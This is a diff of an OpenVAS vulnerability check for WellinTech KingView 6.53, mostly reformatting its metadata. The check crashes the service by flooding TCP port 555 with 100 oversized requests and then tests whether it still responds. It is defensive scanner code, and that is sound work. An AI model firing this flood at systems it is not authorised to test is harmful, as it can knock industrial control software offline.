@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wellintech_kingview_mult_vuln.nasl 4690 2016-12-06 14:44:58Z cfi $
+# $Id: gb_wellintech_kingview_mult_vuln.nasl 9325 2018-04-05 09:43:08Z cfischer $
 #
 # WellinTech KingView Multiple Vulnerabilities
 #
@@ -27,12 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802911");
-  script_version("$Revision: 4690 $");
+  script_version("$Revision: 9325 $");
   script_cve_id("CVE-2012-1830", "CVE-2012-1831", "CVE-2012-1832", "CVE-2012-2560");
   script_bugtraq_id(54280);
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2016-12-06 15:44:58 +0100 (Tue, 06 Dec 2016) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-04-05 11:43:08 +0200 (Thu, 05 Apr 2018) $");
   script_tag(name:"creation_date", value:"2012-07-10 17:26:36 +0530 (Tue, 10 Jul 2012)");
   script_name("WellinTech KingView Multiple Vulnerabilities");
   script_category(ACT_DENIAL);
@@ -47,34 +47,29 @@ if(description)
   script_xref(name:"URL", value:"http://packetstormsecurity.org/files/114165/kingviewtouchview-overflow.txt");
   script_xref(name:"URL", value:"http://packetstormsecurity.org/files/114166/kingviewtouchview-overwrite.txt");
 
-  tag_impact = "Successful exploitation allows remote attackers to gain sensitive information
+  script_tag(name:"impact", value:"Successful exploitation allows remote attackers to gain sensitive information
   via directory traversal attacks or cause the application to crash, creating a
   denial of service condition.
 
-  Impact Level: Application";
+  Impact Level: Application");
 
-  tag_affected = "WellinTech KingView version 6.53";
+  script_tag(name:"affected", value:"WellinTech KingView version 6.53");
 
-  tag_insight = "- Multiple errors in 'touchview.exe' when processing certain requests, can
-    be exploited to cause a crash via a specially crafted request sent to
-    TCP port 555.
+  script_tag(name:"insight", value:"- Multiple errors in 'touchview.exe' when processing certain requests, can
+    be exploited to cause a crash via a specially crafted request sent to TCP port 555.
+
   - A specially crafted packet to either Port 2001/TCP or Port 2001/UDP, an
-    attacker may read from an invalid memory location in the KingView
-    application.
+    attacker may read from an invalid memory location in the KingView application.
+
   - A specially crafted GET request via HTTP on Port 8001/TCP, an attacker
-    may access arbitrary information from the KingView application.";
+    may access arbitrary information from the KingView application.");
 
-  tag_solution = "Apply the patch from below link
-  http://www.wellintech.com/index.php/news/33-patch-for-kingview653";
+  script_tag(name:"solution", value:"Apply the patch from below link,
 
-  tag_summary = "This host is running WellinTech KingView and is prone to multiple
-  vulnerabilties.";
+  http://www.wellintech.com/index.php/news/33-patch-for-kingview653");
 
-  script_tag(name:"impact", value:tag_impact);
-  script_tag(name:"affected", value:tag_affected);
-  script_tag(name:"insight", value:tag_insight);
-  script_tag(name:"solution", value:tag_solution);
-  script_tag(name:"summary", value:tag_summary);
+  script_tag(name:"summary", value:"This host is running WellinTech KingView and is prone to multiple
+  vulnerabilties.");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_vul");
@@ -82,51 +77,35 @@ if(description)
   exit(0);
 }
 
-## Variable Initialization
-req = "";
-port = 0;
-soc = 0;
-soc1 = 0;
-
-## Port
 port = 555;
 
-## Check the TCP port status
 if(!get_port_state(port)){
   exit(0);
 }
 
-## Open the socket
 soc = open_sock_tcp(port);
 if(!soc){
   exit(0);
 }
 
-## Construct attack request
 req = crap(length:100000, data:"D");
-
-## Close Socket
 close(soc);
 
-## Send crafted request
-for(i=0;i<100;i++)
-{
+for(i=0;i<100;i++){
   soc = open_sock_tcp(port);
-  if(soc)
-  {
+  if(soc){
     send(socket:soc, data:req);
     close(soc);
-  }
-  else {
+  } else {
    break;
   }
 }
 
-## Open the socket to confirm server is crashed
 soc1 = open_sock_tcp(port);
-if(!soc1)
-{
-  security_message(soc1);
+if(!soc1){
+  security_message(port:port);
   exit(0);
 }
+
 close(soc1);
+exit(99);
